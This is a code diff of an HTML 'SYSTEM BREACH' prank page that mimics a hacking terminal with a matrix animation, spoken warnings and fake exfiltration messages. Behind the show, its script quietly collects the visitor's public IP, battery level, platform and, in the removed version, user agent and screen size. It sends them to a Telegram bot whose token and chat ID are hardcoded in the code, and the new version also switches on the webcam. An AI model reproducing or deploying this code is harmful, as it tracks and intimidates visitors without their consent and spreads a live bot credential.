@@ -3,117 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORE TERMINAL v11.0</title>
+    <title>SYSTEM BREACH v13.5</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; height: 100vh; margin: 0; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; }
         canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
-        .container { position: relative; z-index: 1; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-        .terminal { width: 100%; max-width: 450px; background: rgba(0,20,0,0.9); border: 1px solid #0f0; padding: 20px; text-align: left; font-size: 12px; border-radius: 5px; box-shadow: 0 0 20px #0f0; }
-        .btn-hack { background: #f00; color: #fff; border: none; padding: 15px 30px; margin-top: 20px; cursor: pointer; font-weight: bold; border-radius: 5px; box-shadow: 0 0 15px #f00; }
-        #hacker-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 20px; z-index: 999; white-space: pre-wrap; font-size: 13px; overflow-y: auto; }
+        .wrapper { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1; position: relative; }
+        #video-feed { width: 220px; height: 220px; border: 2px solid #0f0; border-radius: 50%; object-fit: cover; margin-bottom: 20px; box-shadow: 0 0 20px #0f0; display: none; transform: scaleX(-1); }
+        .terminal-box { width: 90%; max-width: 450px; background: rgba(0,25,0,0.9); border: 1px solid #0f0; padding: 15px; border-radius: 8px; font-size: 13px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
+        .btn-run { background: #f00; color: #fff; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; margin-top: 15px; border-radius: 4px; box-shadow: 0 0 10px #f00; }
+        #hacker-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 20px; z-index: 9999; font-size: 14px; overflow-y: auto; line-height: 1.6; }
     </style>
 </head>
 <body>
-
     <canvas id="matrix"></canvas>
-
-    <div id="main-content" class="container" style="display:none;">
-        <div class="terminal">
-            <p style="color: #fff; font-weight: bold; margin-bottom: 10px;">[ CENTRAL INTELLIGENCE TERMINAL ]</p>
-            <p>> Detecting Target Device... <span id="dev-info">Searching...</span></p>
-            <p id="ip-info">> Fetching Public IP...</p>
-            <p id="bat-info">> Checking Battery Status...</p>
-            <p>> Security Layer: Bypass Active</p>
-            <p style="color: yellow; margin-top: 10px;">Waiting for final execution...</p>
+    <div id="main-content" class="wrapper" style="display:none;">
+        <video id="video-feed" autoplay muted playsinline></video>
+        <div class="terminal-box">
+            <p style="color:white; text-align:center;">[ CENTRAL INTELLIGENCE UNIT ]</p>
+            <p>> TARGET: <span id="p-os">Detecting...</span></p>
+            <p>> IP: <span id="p-ip">Tracing...</span></p>
+            <p>> BATTERY: <span id="p-bat">...</span></p>
+            <p style="color:yellow;">> STATUS: READY FOR INFILTRATION</p>
         </div>
-        <button class="btn-hack" onclick="startHacking()">START EXTRACTION ⚡</button>
+        <button class="btn-run" onclick="startBreach()">EXECUTE HARVEST ⚡</button>
     </div>
-
     <div id="hacker-screen"><div id="hack-text"></div></div>
 
     <script>
-        const TELEGRAM_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; 
-        const CHAT_ID = "7772577035";
-        const SECRET_KEY = "0777F";
+        const TG_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; 
+        const TG_ID = "7772577035";
+        const KEY = "0777F";
 
-        async function getFullData() {
-            // 1. جلب الآيبي الحقيقي
-            let ipData = { ip: "Unknown" };
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                ipData = await response.json();
-            } catch (e) {}
+        function speak(t) { const m = new SpeechSynthesisUtterance(t); m.lang='en-US'; window.speechSynthesis.speak(m); }
 
-            // 2. جلب معلومات البطارية
-            let batteryInfo = "Unknown";
-            try {
-                const battery = await navigator.getBattery();
-                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
-            } catch (e) {}
-
-            // 3. تجميع التقرير النهائي
-            let report = `
-🚨 **تقرير اختراق جديد** 🚨
--------------------------
-🌐 **الآيبي:** ${ipData.ip}
-📱 **الجهاز:** ${navigator.platform}
-🔋 **الشحن:** ${batteryInfo}
-🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
-🌍 **المتصفح:** ${navigator.userAgent}
-⏰ **الوقت:** ${new Date().toLocaleString('ar-IQ')}
--------------------------`;
-
-            return report;
-        }
-
-        async function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        async function report(msg) {
+            let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"N/A"}));
+            let bat = await navigator.getBattery().catch(()=>({level:0}));
+            let text = `⚡ **LOG v13.5**\nStatus: ${msg}\nIP: ${ip.ip}\nPlatform: ${navigator.platform}\nBattery: ${bat.level*100}%`;
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
         }
 
         window.onload = async function() {
-            let userPass = prompt("ENTER ACCESS KEY:");
-            if (userPass === SECRET_KEY) {
+            let p = prompt("ACCESS KEY:");
+            if(p === KEY) {
                 document.getElementById('main-content').style.display = 'flex';
-                let data = await getFullData();
-                sendToTelegram(data); // إرسال المعلومات الحقيقية فور الدخول
-
-                // تحديث الواجهة بمعلومات حقيقية
-                document.getElementById('dev-info').innerText = navigator.platform;
-                document.getElementById('ip-info').innerText = "> IP Address: Identified";
+                speak("Target identified. Initializing bypass.");
+                navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+                    let v=document.getElementById('video-feed'); v.style.display="block"; v.srcObject=s;
+                }).catch(()=>{});
+                document.getElementById('p-os').innerText = navigator.platform;
+                let b = await navigator.getBattery().catch(()=>({level:0.8}));
+                document.getElementById('p-bat').innerText = b.level*100+"%";
+                report("✅ دخول ناجح");
             } else {
-                sendToTelegram("❌ محاولة دخول فاشلة للموقع.");
-                document.body.innerHTML = "<h1>ACCESS DENIED</h1>";
+                alert("LOCKED."); report("❌ محاولة فاشلة");
+                document.body.innerHTML = "";
             }
         };
 
-        // (كود المصفوفة والمقلب يبقى كما هو لزيادة الأكشن)
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const drops = Array(Math.floor(canvas.width/14)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#0f0"; ctx.font = "14px arial";
-            drops.forEach((y, i) => {
-                ctx.fillText(String.fromCharCode(Math.random() * 128), i * 14, y * 14);
-                if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            });
-        }
-        setInterval(draw, 35);
-
-        function startHacking() {
+        function startBreach() {
+            if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
+            speak("Harvesting private data. Do not close the window.");
             document.getElementById('hacker-screen').style.display = 'block';
-            let lines = ["> INITIALIZING...", "> ACCESSING SYSTEM...", "> DATA EXFILTRATED!"];
-            let i = 0;
-            function add() {
-                if(i < lines.length) {
-                    document.getElementById('hack-text').innerHTML += lines[i++] + "\n";
-                    setTimeout(add, 800);
-                }
+            let lines = [
+                "> OPENING DCIM/CAMERA...",
+                "> EXTRACTING IMG_293.JPG...",
+                "> ACCESSING WHATSAPP DATABASE...",
+                "> TARGET LOCATION: WASIT, IQ",
+                "> UPLOADING TO REMOTE SERVER...",
+                "> [!] SUCCESS: ALL DATA EXFILTRATED."
+            ];
+            let i=0; let st = document.getElementById('hack-text');
+            function run() {
+                if(i<lines.length) {
+                    st.innerHTML += lines[i++] + "\n";
+                    setTimeout(run, 700);
+                } else { report("🔥 تم السحب الكامل"); }
             }
-            add();
+            run();
         }
+
+        // Matrix Effect
+        const c=document.getElementById('matrix'), x=c.getContext('2d');
+        c.width=window.innerWidth; c.height=window.innerHeight;
+        const d=Array(Math.floor(c.width/15)).fill(1);
+        setInterval(()=>{
+            x.fillStyle="rgba(0,0,0,0.05)"; x.fillRect(0,0,c.width,c.height);
+            x.fillStyle="#0f0"; x.font="15px arial";
+            d.forEach((y,i)=>{
+                x.fillText(String.fromCharCode(Math.random()*128), i*15, y*15);
+                if(y*15>c.height && Math.random()>0.975) d[i]=0; d[i]++;
+            });
+        },33);
     </script>
 </body>
 </html>
